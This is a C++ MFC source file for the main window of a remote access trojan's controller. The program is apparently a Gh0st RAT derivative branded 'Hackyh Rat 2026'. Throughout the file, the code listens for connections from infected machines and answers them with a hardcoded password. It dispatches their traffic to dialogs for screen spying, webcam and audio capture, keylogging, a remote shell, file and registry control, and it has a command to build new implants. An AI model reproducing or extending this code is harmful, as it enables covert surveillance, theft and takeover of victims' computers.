// MainFrm.cpp : implementation of the CMainFrame class
//

#include "stdafx.h"
#include "gh0st.h"

#include "MainFrm.h"
#include "Gh0stView.h"
#include "FileManagerDlg.h"
#include "ScreenSpyDlg.h"
#include "WebCamDlg.h"
#include "AudioDlg.h"
#include "KeyBoardDlg.h"
#include "SystemDlg.h"
#include "ShellDlg.h"
#include "BuildServer.h"
#include "Settings.h"
#include "RegDlg.h"
#include "ServersDlg.h"
#include "SysInfo.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif
#define WM_ICON_NOTIFY WM_USER+10

extern CGh0stView* g_pConnectView; //在NotifyProc中初始化
CIOCPServer *m_iocpServer = NULL;
CString		m_PassWord = "password";
CMainFrame	*g_pFrame; // 在CMainFrame::CMainFrame()中初始化
/////////////////////////////////////////////////////////////////////////////
// CMainFrame

IMPLEMENT_DYNCREATE(CMainFrame, CFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
	//{{AFX_MSG_MAP(CMainFrame)
	ON_WM_CREATE()
	ON_WM_CLOSE()
	ON_COMMAND(IDM_EXIT, OnExit)
	ON_COMMAND(IDM_SETTING, OnSetting)
	ON_COMMAND(IDM_BUILD, OnBuild)
	//}}AFX_MSG_MAP
	ON_COMMAND(XTP_ID_CUSTOMIZE, OnCustomize)
END_MESSAGE_MAP()

static UINT indicators[] =
{
	ID_STAUTSTIP,           // status line indicator
	ID_STAUTSSPEED,
	ID_STAUTSPORT,
	ID_STAUTSCOUNT
};

// static UINT uHideCmds[] =
// {
// 	ID_FILE_PRINT,
// 	ID_FILE_PRINT_PREVIEW,
// };
/////////////////////////////////////////////////////////////////////////////
// CMainFrame construction/destruction

CMainFrame::CMainFrame()
{
	// TODO: add member initialization code here
	g_pFrame = this;
	nCount = 0;
	nXP = 0;
	nWin7 = 0;
	nWin8 = 0;
	n2012 = 0;
	nWin10 = 0;
	nWin11 = 0;
	n2016 = 0;
	n2019 = 0;
	n2022 = 0;
	n2025 = 0;
	nOther = 0;
}

CMainFrame::~CMainFrame()
{
}

int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;
	this->CenterWindow(CWnd::GetDesktopWindow());
	// Create Status bar.
	// Important: All control bars including the Status Bar
	// must be created before CommandBars....
	if (!m_wndStatusBar.Create(this) ||!m_wndStatusBar.SetIndicators(indicators,
		sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}
	
	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 180);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 70);
	m_wndStatusBar.SetPaneInfo(3, m_wndStatusBar.GetItemID(3), SBPS_NORMAL, 80);

	// Initialize the command bars
	if (!InitCommandBars())
		return -1;

	// Get a pointer to the command bars object.
	CXTPCommandBars* pCommandBars = GetCommandBars();
	if(pCommandBars == NULL)
	{
		TRACE0("Failed to create command bars object.\n");
		return -1;      // fail to create
	}

	// Add the menu bar
	CXTPCommandBar* pMenuBar = pCommandBars->SetMenu(
		_T("Menu Bar"), IDR_MAINFRAME);
	if(pMenuBar == NULL)
	{
		TRACE0("Failed to create menu bar.\n");
		return -1;      // fail to create
	}

	// Load Visual Studio 2012 Dark style resources (frame parts + ANSI color ini)
	{
		TCHAR szVS[_MAX_PATH];
		::GetModuleFileName(AfxGetInstanceHandle(), szVS, _MAX_PATH);
		CString strVSDir(szVS);
		strVSDir = strVSDir.Left(strVSDir.ReverseFind(_T('\\'))) + _T("\\Styles\\VisualStudio2012.dll");
		XTPResourceImages()->SetHandle(strVSDir, _T("VisualStudio2012Dark.ini"));
	}
	CXTPPaintManager::SetTheme(xtpThemeVisualStudio2012Dark);
	pCommandBars->EnableFrameTheme(TRUE);
	/*
	xtpThemeOffice2000,     // Office 2000 theme.
	xtpThemeOfficeXP,       // Office XP theme.
	xtpThemeOffice2003,     // Office 2003 theme.
	xtpThemeNativeWinXP,    // Windows XP themes support.
	xtpThemeWhidbey,        // Visual Studio 2005 theme.
	xtpThemeResource,       // Office 2007 theme.
	xtpThemeRibbon,         // Office 2007 style ribbon theme
	xtpThemeVisualStudio2008, // Visual Studio 2008 theme
	xtpThemeVisualStudio6,    // Visual Studio 6 theme
	xtpThemeVisualStudio2010, // Visual Studio 2010 theme
	xtpThemeCustom          // Custom theme.
	*/

	// Set "Always Show Full Menus" option to the FALSE
	pCommandBars->GetCommandBarsOptions()->bAlwaysShowFullMenus = FALSE;

	pCommandBars->GetShortcutManager()->SetAccelerators(IDR_MAINFRAME);

		CXTPToolBar* pCommandBar = (CXTPToolBar*)pCommandBars->Add(_T("工具栏"), xtpBarTop);
	if (!pCommandBar || !pCommandBar->LoadToolBar(IDR_TOOLBAR))
	{
		TRACE0("Failed to create toolbar\n");
		return -1;
	}
	CXTPCommandBarsOptions* pOptions = pCommandBars->GetCommandBarsOptions();
	pOptions->bShowExpandButtonAlways = FALSE;//不显示扩展按钮
	RedrawWindow(0, 0, RDW_INVALIDATE|RDW_UPDATENOW|RDW_ERASE|RDW_ALLCHILDREN);   
	GetCommandBars()->GetPaintManager()->RefreshMetrics(); 
	GetCommandBars()->RedrawCommandBars();
	
	ModifyStyle(WS_THICKFRAME, 0);
	ModifyStyle(0, WS_THICKFRAME);//去掉状态栏下面拖动的Gripper
	
	pCommandBars->GetCommandBarsOptions()->bShowTextBelowIcons = TRUE;
	pCommandBars->GetCommandBarsOptions()->ShowKeyboardCues(xtpKeyboardCuesShowWindowsDefault);
	


	return 0;
}

void CMainFrame::OnClose()
{
	// Save the current state for toolbars and menus.
	m_TrayIcon.RemoveIcon();
	
	m_iocpServer->Shutdown();
	delete m_iocpServer;
	CFrameWnd::OnClose();
}

void CMainFrame::OnCustomize()
{
	// Get a pointer to the command bars object.
	CXTPCommandBars* pCommandBars = GetCommandBars();
	if(pCommandBars != NULL)
	{
		// Instanciate the customize dialog object.
		CXTPCustomizeSheet dlg(pCommandBars);

		// Add the keyboard page to the customize dialog.
		CXTPCustomizeKeyboardPage pageKeyboard(&dlg);
		dlg.AddPage(&pageKeyboard);
		pageKeyboard.AddCategories(IDR_MAINFRAME);

		// Add the options page to the customize dialog.
		CXTPCustomizeOptionsPage pageOptions(&dlg);
		dlg.AddPage(&pageOptions);

		// Add the commands page to the customize dialog.
		CXTPCustomizeCommandsPage* pCommands = dlg.GetCommandsPage();
		pCommands->AddCategories(IDR_MAINFRAME);

		// Use the command bar manager to initialize the
		// customize dialog.
		pCommands->InsertAllCommandsCategory();
		pCommands->InsertBuiltInMenus(IDR_MAINFRAME);
		pCommands->InsertNewMenuCategory();

		// Dispaly the dialog.
		dlg.DoModal();
	}
}

extern CString strName;
BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	if( !CFrameWnd::PreCreateWindow(cs) )
		return FALSE;
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs
	cs.style |= WS_CLIPCHILDREN|WS_CLIPSIBLINGS;
	cs.cx = 895;
	cs.cy = 520;
	cs.style &= ~FWS_ADDTOTITLE;
/*	cs.lpszName = "远控";*/
	CString strTitle;
	strTitle.Format(_T("Hackyh Rat 2026 V1.0 个人版-[https://www.hackyh.com]"),strName);
	cs.lpszName = strTitle;
	return TRUE;
}

/////////////////////////////////////////////////////////////////////////////
// CMainFrame diagnostics

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
	CFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CFrameWnd::Dump(dc);
}

#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMainFrame message handlers

void CALLBACK CMainFrame::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{
	try
	{
		CMainFrame* pFrame = (CMainFrame*) lpParam;
		CString str;
		// 对g_pConnectView 进行初始化
//		g_pConnectView = (CGh0stView *)((CGh0stApp *)AfxGetApp())->m_pConnectView;
		
		// g_pConnectView还没创建，这情况不会发生
// 		if (((CGh0stApp *)AfxGetApp())->m_pConnectView == NULL)
// 			return;
//		g_pConnectView->m_iocpServer = m_iocpServer;
		str.Format("S: %.2f kb/s R: %.2f kb/s", (float)m_iocpServer->m_nSendKbps / 1024, (float)m_iocpServer->m_nRecvKbps / 1024);
		g_pFrame->m_wndStatusBar.SetPaneText(1, str);
		
		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			g_pConnectView->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			ProcessReceive(pContext);
			break;
		case NC_RECEIVE_COMPLETE:
			ProcessReceiveComplete(pContext);
			break;
		}
	}catch(...){}
}

void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
{
	CString		str;
	if (m_iocpServer != NULL)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;
		
	}
	m_iocpServer = new CIOCPServer;
	
	// 开启IPCP服务器
	if (m_iocpServer->Initialize(NotifyProc, this, nMaxConnections, nPort))
	{
		str.Format("端口: %d", nPort);
		m_wndStatusBar.SetPaneText(2, str);
	}
	else
	{
		str.Format("端口%d监听失败", nPort);
		m_wndStatusBar.SetPaneText(2, str);
	}
	
	m_wndStatusBar.SetPaneText(3, "连接: 0");
}


void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
{	
	if (pContext == NULL)
		return;
	
	// 如果管理对话框打开，交给相应的对话框处理
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case FILEMANAGER_DLG:
			((CFileManagerDlg *)dlg)->OnReceiveComplete();
			break;
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceiveComplete();
			break;
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceiveComplete();
			break;
		case KEYBOARD_DLG:
			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
			break;
		case SYSTEM_DLG:
			((CSystemDlg *)dlg)->OnReceiveComplete();
			break;
		case SHELL_DLG:
			((CShellDlg *)dlg)->OnReceiveComplete();
			break;
		case REGEDIT_DLG:             //注册表
            ((CRegDlg *)dlg)->OnReceiveComplete();
			break;
		case SERVERS_DLG:             //服务
            ((CServersDlg *)dlg)->OnReceiveComplete();
			break;
		case SYSINFO_DLG:
			((CSysInfo *)dlg)->OnReceiveComplete();
			break;
		default:
			break;
		}
		return;
	}

	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_AUTH: // 要求验证
		m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
		break;
	case TOKEN_HEARTBEAT: // 回复心跳包
		{
			BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}
 		break;
	case TOKEN_LOGIN: // 上线包
		{
			if (!((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "MaxConnectionAuto"))
			{
				if (m_iocpServer->m_nMaxConnections <= g_pFrame->nCount)
				{
					closesocket(pContext->m_Socket);
				}
				else
				{
					pContext->m_bIsMainSocket = true;
					g_pConnectView->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
				}
			}
			else
			{
				pContext->m_bIsMainSocket = true;
				g_pConnectView->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
			}
			// 激活
			BYTE	bToken = COMMAND_ACTIVED;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}
		break;
	case TOKEN_DRIVE_LIST: // 驱动器列表
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
		g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO: //
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
		g_pConnectView->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
		g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_WEBCAM_NODEVICE: // slave has no webcam
		g_pConnectView->PostMessage(WM_WEBCAM_NODEVICE, 0, (LPARAM)pContext);
		break;
	case TOKEN_AUDIO_START: // 语音
		g_pConnectView->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_KEYBOARD_START:
		g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PSLIST:
		g_pConnectView->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SHELL_START:
		g_pConnectView->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_REGEDIT:              //注册表管理    
		g_pConnectView->PostMessage(WM_OPENREGEDITDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SERVERS:              //服务管理   
		g_pConnectView->PostMessage(WM_OPENSERVERSDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SYSINFOLIST:// 主机管理
		g_pConnectView->PostMessage(WM_OPENSYSINFODIALOG, 0, (LPARAM)pContext);
		break;
		// 命令停止当前操作
	default:
		closesocket(pContext->m_Socket);
		break;
	}	
}

// 需要显示进度的窗口
void CMainFrame::ProcessReceive(ClientContext *pContext)
{
	if (pContext == NULL)
		return;
	// 如果管理对话框打开，交给相应的对话框处理
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceive();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceive();
			break;
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceive();
			break;
		default:
			break;
		}
		return;
	}
}

void CMainFrame::ShowNumber()
{
	CString str;
	str.Format("连接: %d", nCount);
	m_wndStatusBar.SetPaneText(3, str);
}

void CMainFrame::UpdateOS(int m_XP,int m_Win7,int m_Win8,int m_2012,int m_Win10,int m_Win11,int m_2016,int m_2019,int m_2022,int m_2025,int m_Other)
{
	CString str;
	str.Format(_T("主机统计: —> XP:%d  Win7:%d  Win8:%d  Win10:%d  Win11:%d  2012:%d  2016:%d  2019:%d  2022:%d  2025:%d  Other:%d"),m_XP,m_Win7,
		m_Win8,m_Win10,m_Win11,m_2012,m_2016,m_2019,m_2022,m_2025,m_Other);
	m_wndStatusBar.SetPaneText(0, str);
}
void CMainFrame::OnSetting() 
{
	// TODO: Add your command handler code here
	CSettings dlg;
	dlg.DoModal();
}

void CMainFrame::OnBuild() 
{
	// TODO: Add your command handler code here
	CBuildServer dlg;
	dlg.DoModal();
}
void CMainFrame::OnExit() 
{
	// TODO: Add your command handler code here
	OnClose();
}
